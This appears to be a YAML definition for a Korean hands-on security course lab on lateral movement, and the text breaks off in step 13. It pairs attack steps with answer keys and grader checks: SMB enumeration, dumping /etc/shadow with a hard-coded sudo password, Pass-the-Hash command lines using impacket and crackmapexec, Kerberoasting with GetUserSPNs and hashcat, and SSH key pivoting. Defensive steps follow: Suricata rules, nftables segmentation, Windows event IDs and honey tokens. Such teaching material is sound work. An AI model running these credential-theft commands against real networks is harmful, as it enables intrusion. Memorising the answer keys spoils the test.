lab_id: battle-adv-nonai-week04
title: 측면 이동 심화 — Pass-the-Hash, Kerberoasting
version: non-ai
course: battle-adv-nonai
week: 4
description: 내부 네트워크에서의 측면 이동(Lateral Movement) 심화 기법을 실습한다. Pass-the-Hash, Kerberoasting, Token Impersonation 등의 자격 증명 기반 공격과 이에 대한 탐지/방어 방법을 학습한다.
difficulty: hard
duration_minutes: 150
objectives:
- Pass-the-Hash 공격의 원리와 실행 방법을 이해한다
- Kerberos 프로토콜 취약점을 이용한 공격 기법을 실습한다
- 측면 이동의 네트워크 및 호스트 기반 탐지 방법을 학습한다
- 측면 이동 방지를 위한 네트워크 세분화 전략을 수립한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 내부 네트워크 10.20.30.0/24의 활성 호스트를 열거하라. ARP 스캔으로 동일 서브넷의 모든 활성 호스트를 발견하라.
  hint: nmap -sn 또는 arp-scan을 사용하여 호스트를 열거한다.
  category: recon
  points: 10
  answer: nmap -sn 10.20.30.0/24 -oG /tmp/lateral_hosts.txt && grep 'Up' /tmp/lateral_hosts.txt
  answer_detail: 측면 이동의 첫 단계는 내부 네트워크의 활성 호스트를 파악하는 것이다(T1018 Remote System Discovery). ARP 스캔은 같은 서브넷에서 가장 빠르고 조용한 호스트 발견 방법이다. 방화벽에 차단되지 않으며 ICMP보다 신뢰성이 높다.
  verify:
    type: output_contains
    expect: Up
  target_vm: attacker
- order: 2
  instruction: 발견된 호스트들의 SMB 서비스를 열거하라. SMB 공유, 사용자 목록, OS 정보를 수집하라.
  hint: smbclient -L 또는 enum4linux를 사용하여 SMB 정보를 수집한다.
  category: recon
  points: 10
  answer: for host in 10.20.30.1 10.20.30.80 10.20.30.100; do echo "=== $host ==="; smbclient -L //$host -N 2>&1 | head -10; echo; done
  answer_detail: SMB 열거(T1135 Network Share Discovery)는 Windows/Samba 환경에서 공유 자원, 사용자 계정, 그룹 정보를 수집하는 기법이다. -N(No password)으로 익명 접근을 시도하며, 성공 시 공유 목록과 OS 정보를 획득할 수 있다.
  verify:
    type: output_contains
    expect: ===
  target_vm: attacker
- order: 3
  instruction: 로컬 시스템의 패스워드 해시를 추출하라. /etc/shadow 파일에서 해시를 읽고 형식을 분석하라.
  hint: sudo cat /etc/shadow로 해시를 확인하고, 해시 알고리즘을 식별한다.
  category: exploit
  points: 10
  answer: 'echo ''1'' | sudo -S cat /etc/shadow 2>/dev/null | grep -v '':\*:\|:!:'' | head -5; echo ''---''; echo ''Hash formats: $1$=MD5, $5$=SHA-256, $6$=SHA-512, $y$=yescrypt'''
  answer_detail: 'OS Credential Dumping: /etc/shadow(T1003.008)에서 패스워드 해시를 추출한다. Linux에서 $6$는 SHA-512, $y$는 yescrypt 해시를 의미한다. 이 해시를 Pass-the-Hash 또는 크래킹에 사용할 수 있다. 방어: shadow 파일 접근 제한, auditd 모니터링.'
  verify:
    type: output_contains
    expect: Hash formats
  target_vm: attacker
- order: 4
  instruction: Pass-the-Hash 공격의 원리를 시뮬레이션하라. NTLM 해시를 이용하여 평문 비밀번호 없이 인증하는 과정을 설명하고, pth-smbclient 사용법을 시뮬레이션하라.
  hint: NTLM 해시 형식과 PtH 도구의 사용법을 정리한다.
  category: exploit
  points: 10
  answer: "cat > /tmp/pth_simulation.txt << 'EOF'\n=== Pass-the-Hash Attack Simulation ===\n\n1. NTLM Hash Format: LM_HASH:NT_HASH\n   Example: aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42\n\
    \n2. Attack Tools:\n   pth-smbclient //target/share -U domain/user%hash --pw-nt-hash\n   impacket-psexec -hashes LM:NT user@target\n   impacket-wmiexec -hashes LM:NT user@target\n   crackmapexec smb\
    \ target -u user -H NT_HASH\n\n3. Why it works:\n   NTLM auth uses hash directly - no plaintext needed\n   Server compares hash(challenge+stored_hash) with hash(challenge+provided_hash)\n\n4. Detection:\n\
    \   - Event ID 4624 LogonType 3 (Network) with NTLM auth\n   - Same hash used from multiple source IPs\n   - Lateral movement patterns in SIEM\nEOF\ncat /tmp/pth_simulation.txt"
  answer_detail: Pass-the-Hash(T1550.002)는 NTLM 인증 프로토콜의 설계적 취약점을 이용한다. NTLM 인증은 해시 자체로 인증하므로 평문 비밀번호가 필요 없다. 공격자는 메모리(lsass.exe)나 SAM 데이터베이스에서 해시를 추출한 후 다른 시스템에 인증할 수 있다.
  verify:
    type: output_contains
    expect: Pass-the-Hash
  target_vm: attacker
- order: 5
  instruction: Kerberos 프로토콜의 동작 원리를 분석하라. KDC, TGT, TGS의 역할을 정리하고, Kerberoasting 공격이 가능한 이유를 설명하라.
  hint: Kerberos 인증 흐름(AS-REQ → AS-REP → TGS-REQ → TGS-REP)을 정리한다.
  category: analysis
  points: 10
  answer: "cat > /tmp/kerberos_analysis.txt << 'EOF'\n=== Kerberos Protocol & Kerberoasting Analysis ===\n\n1. Kerberos Authentication Flow:\n   Client → KDC: AS-REQ (username + timestamp encrypted with\
    \ user's hash)\n   KDC → Client: AS-REP (TGT encrypted with krbtgt hash)\n   Client → KDC: TGS-REQ (TGT + target service SPN)\n   KDC → Client: TGS-REP (Service Ticket encrypted with service account\
    \ hash)\n   Client → Service: AP-REQ (Service Ticket)\n\n2. Kerberoasting Attack (T1558.003):\n   - Any authenticated user can request TGS for any SPN\n   - TGS is encrypted with service account's NTLM\
    \ hash\n   - Attacker extracts TGS and cracks offline\n   - No failed login events generated!\n\n3. Attack Steps:\n   GetUserSPNs.py -request -dc-ip DC_IP domain/user:password\n   hashcat -m 13100 tgs_hashes.txt\
    \ wordlist.txt\n\n4. Vulnerable: Service accounts with weak passwords + SPNs registered\nEOF\ncat /tmp/kerberos_analysis.txt"
  answer_detail: Kerberoasting(T1558.003)은 Kerberos TGS(Ticket Granting Service) 티켓이 서비스 계정의 NTLM 해시로 암호화되는 점을 악용한다. 인증된 도메인 사용자는 누구나 임의 SPN의 TGS를 요청할 수 있고, 이를 오프라인에서 크래킹하면 서비스 계정의 비밀번호를 획득한다.
  verify:
    type: output_contains
    expect: Kerberoasting
  target_vm: attacker
- order: 6
  instruction: SSH 키 기반 측면 이동을 실습하라. 타겟 네트워크 내 다른 서버로 SSH 키를 이용한 접근을 시도하라.
  hint: ssh -i 옵션으로 개인키를 지정하여 다른 서버에 접근한다.
  category: exploit
  points: 10
  answer: ssh-keygen -t ed25519 -f /tmp/lateral_key -N '' -q && echo 'Testing SSH lateral movement:' && ssh -i /tmp/lateral_key -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.1 'hostname'
    2>&1 | head -5; ssh -i /tmp/lateral_key -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.80 'hostname' 2>&1 | head -5
  answer_detail: SSH를 이용한 측면 이동(T1021.004)은 Linux 환경에서 가장 흔한 기법이다. 이미 획득한 SSH 개인키나 에이전트 포워딩을 통해 다른 서버에 접근한다. authorized_keys에 등록된 키가 있으면 비밀번호 없이 접근이 가능하다.
  verify:
    type: output_contains
    expect: SSH lateral
  target_vm: attacker
- order: 7
  instruction: Impacket 도구 모음의 측면 이동 기능을 분석하라. psexec, wmiexec, smbexec의 차이점과 각각의 탐지 포인트를 정리하라.
  hint: 각 도구의 실행 원리, 사용 프로토콜, 로그 특성을 비교한다.
  category: analysis
  points: 10
  answer: 'cat > /tmp/impacket_comparison.txt << ''EOF''

    === Impacket Lateral Movement Tools Comparison ===


    | Tool | Protocol | Execution Method | Artifact | Detection |

    |------|----------|-----------------|----------|----------|

    | psexec | SMB+SCM | Service creation | Service binary | Event 7045, named pipe |

    | wmiexec | DCOM/WMI | WMI process create | wmiprvse.exe child | WMI event, process tree |

    | smbexec | SMB+SCM | Service (no binary) | Temp batch file | Event 7045, cmd.exe |

    | atexec | SMB+ATSVC | Scheduled task | Task XML | Event 4698, schtasks |

    | dcomexec | DCOM | DCOM object | MMC/Excel/ShellBrowser | DCOM event, process tree |


    Common Detection:

    1. Unusual SMB connections between workstations

    2. Service creation events (Event ID 7045)

    3. Remote process creation patterns

    4. Named pipe connections (\\pipe\svcctl, \\pipe\atsvc)

    5. Authentication with NTLM from unusual sources

    EOF

    cat /tmp/impacket_comparison.txt'
  answer_detail: Impacket은 네트워크 프로토콜을 Python으로 구현한 도구 모음으로, 다양한 측면 이동 기법을 제공한다. psexec은 서비스 생성, wmiexec은 WMI, smbexec은 배치 파일, atexec은 스케줄 태스크를 이용한다. 각 기법마다 고유한 아티팩트와 탐지 포인트가 있다.
  verify:
    type: output_contains
    expect: Impacket Lateral
  target_vm: attacker
- order: 8
  instruction: 측면 이동 탐지를 위한 네트워크 모니터링을 설정하라. 내부 호스트 간 비정상 SMB/SSH/WMI 연결을 감지하는 규칙을 작성하라.
  hint: 내부 호스트 간 통상적이지 않은 포트 연결을 모니터링한다.
  category: defense
  points: 10
  answer: 'cat > /tmp/lateral_detection_rules.txt << ''EOF''

    === Lateral Movement Detection Rules ===


    # Suricata Rules

    alert tcp 10.20.30.0/24 any -> 10.20.30.0/24 445 (msg:"Internal SMB connection - possible lateral movement"; flow:to_server,established; threshold:type both, track by_src, count 3, seconds 60; sid:2000001;
    rev:1;)

    alert tcp 10.20.30.0/24 any -> 10.20.30.0/24 22 (msg:"Internal SSH connection - possible lateral movement"; flow:to_server,established; threshold:type both, track by_src, count 5, seconds 60; sid:2000002;
    rev:1;)

    alert tcp 10.20.30.0/24 any -> 10.20.30.0/24 135 (msg:"Internal WMI/DCOM connection - possible lateral movement"; flow:to_server,established; sid:2000003; rev:1;)


    # Network Baseline Violations

    # Normal: only admin servers SSH to others

    # Alert: workstation-to-workstation SSH/SMB

    EOF

    cat /tmp/lateral_detection_rules.txt'
  answer_detail: 측면 이동 탐지의 핵심은 내부 호스트 간 통신의 정상 기준선(baseline)을 설정하고 이탈을 감지하는 것이다. 워크스테이션 간 SMB(445), SSH(22), WMI(135) 연결은 비정상적이며, threshold로 짧은 시간 내 다수 연결을 감지한다.
  verify:
    type: output_contains
    expect: lateral movement
  target_vm: attacker
- order: 9
  instruction: 네트워크 세그먼테이션을 이용한 측면 이동 방지 정책을 설계하라. nftables로 서버 그룹 간 허용/차단 매트릭스를 구현하라.
  hint: 서버 역할별로 set을 정의하고, 그룹 간 필요한 포트만 허용한다.
  category: defense
  points: 10
  answer: "cat > /tmp/segmentation_policy.nft << 'EOF'\n#!/usr/sbin/nft -f\ntable inet segmentation {\n  set control_plane { type ipv4_addr; elements = { 10.20.30.201 } }\n  set security_tier { type ipv4_addr;\
    \ elements = { 10.20.30.1 } }\n  set web_tier { type ipv4_addr; elements = { 10.20.30.80 } }\n  set siem_tier { type ipv4_addr; elements = { 10.20.30.100 } }\n\n  chain forward {\n    type filter hook\
    \ forward priority 0; policy drop;\n    # Control plane can reach all tiers (management)\n    ip saddr @control_plane accept\n    # Web tier cannot initiate to other tiers\n    ip saddr @web_tier ip\
    \ daddr @security_tier drop\n    ip saddr @web_tier ip daddr @siem_tier drop\n    # SIEM can pull logs from all tiers\n    ip saddr @siem_tier tcp dport { 514, 1514 } accept\n    # Established connections\
    \ allowed\n    ct state established,related accept\n  }\n}\nEOF\ncat /tmp/segmentation_policy.nft"
  answer_detail: 네트워크 세그먼테이션은 측면 이동을 방지하는 가장 효과적인 방어 수단이다. 서버를 역할별로 그룹화(control plane, security, web, SIEM)하고, 그룹 간 필요한 최소한의 통신만 허용한다. 기본 정책을 drop으로 설정하고 화이트리스트 방식으로 허용한다.
  verify:
    type: output_contains
    expect: segmentation
  target_vm: attacker
- order: 10
  instruction: Windows 환경의 측면 이동 탐지를 위한 이벤트 로그 분석을 시뮬레이션하라. 핵심 Windows Event ID와 탐지 시나리오를 정리하라.
  hint: Event ID 4624, 4648, 7045, 4698 등의 의미를 정리한다.
  category: defense
  points: 10
  answer: 'cat > /tmp/windows_lateral_events.txt << ''EOF''

    === Windows Event IDs for Lateral Movement Detection ===


    | Event ID | Log | Description | Lateral Movement Indicator |

    |----------|-----|-------------|---------------------------|

    | 4624 | Security | Logon success | Type 3(Network), Type 10(RemoteInteractive) |

    | 4625 | Security | Logon failure | Brute force, credential spray |

    | 4648 | Security | Explicit credential logon | RunAs, PtH |

    | 4672 | Security | Special privileges assigned | Admin logon |

    | 7045 | System | Service installed | psexec, smbexec |

    | 4698 | Security | Scheduled task created | atexec, schtasks |

    | 4688 | Security | Process created | cmd.exe, powershell.exe spawned remotely |

    | 5140 | Security | Network share accessed | SMB lateral movement |

    | 5145 | Security | Detailed share access | File access on remote share |


    Correlation Rules:

    1. 4624(Type3) + 7045 within 5s = PsExec lateral movement

    2. 4624(Type3) + 4688(cmd.exe) = WmiExec lateral movement

    3. Multiple 4624(Type3) from same source to different targets = Lateral sweep

    EOF

    cat /tmp/windows_lateral_events.txt'
  answer_detail: Windows 이벤트 로그는 측면 이동의 핵심 증거 소스이다. 4624(로그인), 7045(서비스 설치), 4698(태스크 생성), 4688(프로세스 생성) 이벤트를 상관 분석하면 PsExec, WmiExec 등의 측면 이동 기법을 탐지할 수 있다.
  verify:
    type: output_contains
    expect: Windows Event IDs
  target_vm: attacker
- order: 11
  instruction: Honey Token을 이용한 측면 이동 탐지 함정을 설계하라. 가짜 자격 증명과 공유 폴더를 배치하여 공격자의 측면 이동을 조기 탐지하라.
  hint: 가짜 SSH 키, 가짜 비밀번호 파일, 가짜 네트워크 공유를 배치한다.
  category: defense
  points: 10
  answer: "cat > /tmp/honey_tokens.txt << 'EOF'\n=== Honey Token Deployment Plan ===\n\n1. Fake Credentials (canary tokens):\n   - /home/admin/.ssh/config → fake host entries pointing to honeypot\n   -\
    \ /opt/backup/credentials.txt → fake passwords that trigger alert on use\n   - /etc/samba/smb.conf → fake share \"financial_data\" on honeypot\n\n2. Honey Services:\n   - 10.20.30.250:445 → SMB honeypot\
    \ (any auth attempt = alert)\n   - 10.20.30.250:22 → SSH honeypot (Cowrie)\n   - 10.20.30.250:3389 → RDP honeypot\n\n3. Detection Triggers:\n   - Any login attempt to honeypot IPs → CRITICAL alert\n\
    \   - Any DNS resolution of honey domains → WARNING alert\n   - Any access to honey files → CRITICAL alert\n\n4. SIEM Rule:\n   IF source_ip IN internal_range AND dest_ip == honeypot_ip\n   THEN alert(\"\
    Lateral Movement Detected\", severity=CRITICAL)\nEOF\ncat /tmp/honey_tokens.txt"
  answer_detail: Honey Token(T1534 Internal Spearphishing 대응)은 공격자를 유인하여 조기 탐지하는 능동적 방어 기법이다. 가짜 자격 증명, 가짜 공유 폴더, 허니팟 서비스를 내부 네트워크에 배치하면, 정상 사용자는 절대 접근하지 않으므로 접근 시도 자체가 침해 지표가 된다.
  verify:
    type: output_contains
    expect: Honey Token
  target_vm: attacker
- order: 12
  instruction: 측면 이동 경로를 시각화하라. 이번 실습에서 시뮬레이션한 측면 이동 경로를 그래프 형태로 표현하라.
  hint: DOT 형식으로 네트워크 그래프를 작성한다.
  category: analysis
  points: 10
  answer: "cat > /tmp/lateral_movement_graph.dot << 'EOF'\ndigraph LateralMovement {\n  rankdir=LR;\n  node [shape=box, style=filled];\n  \n  attacker [label=\"Attacker\\n10.20.30.201\", fillcolor=\"#ff6666\"\
    ];\n  web [label=\"Web Server\\n10.20.30.80\", fillcolor=\"#ffcc66\"];\n  secu [label=\"Security\\n10.20.30.1\", fillcolor=\"#66ff66\"];\n  siem [label=\"SIEM\\n10.20.30.100\", fillcolor=\"#66ccff\"\
    ];\n  honeypot [label=\"Honeypot\\n10.20.30.250\", fillcolor=\"#cc66ff\"];\n  \n  attacker -> web [label=\"1. SQLi\\n(T1190)\", color=red];\n  web -> secu [label=\"2. SSH PtH\\n(T1550.002)\", color=red];\n\
    \  secu -> siem [label=\"3. SSH Key\\n(T1021.004)\", color=red];\n  attacker -> honeypot [label=\"4. Detected!\\n(Honey Token)\", color=blue, style=dashed];\n}\nEOF\ncat /tmp/lateral_movement_graph.dot\
    \ && echo '---' && echo 'Render: dot -Tpng /tmp/lateral_movement_graph.dot -o /tmp/lateral_graph.png'"
  answer_detail: 측면 이동 경로 시각화는 공격 흐름을 이해하고 방어 우선순위를 결정하는 데 필수적이다. Graphviz DOT 형식으로 네트워크 노드와 공격 경로를 표현하면 공격자의 이동 패턴, 핵심 경유지, 탐지 포인트를 직관적으로 파악할 수 있다.
  verify:
    type: output_contains
    expect: LateralMovement
  target_vm: attacker
- order: 13
  instruction: Zero Trust 아키텍처 기반의 측면 이동 방어 전략을 설계하라. Never Trust, Always Verify 원칙을 네트워크 설계에 적용하라.
  hint: 마이크로 세그먼테이션, 지속적 인증, 최소 권한을 결합한다.
  category: defense
  points: 10
  answer: "cat > /tmp/zero_trust_design.txt << 'EOF'\n=== Zero Trust Architecture for Lateral Movement Prevention ===\n\n1. Micro-Segmentation:\n   - Each server = individual security zone\n   - All inter-server\
    \ traffic through policy engine\n   - Default deny, explicit allow per flow\n\n2. Continuous Authentication:\n   - mTLS for all service-to-service communication\n   - Short-lived tokens (15min max)\n\
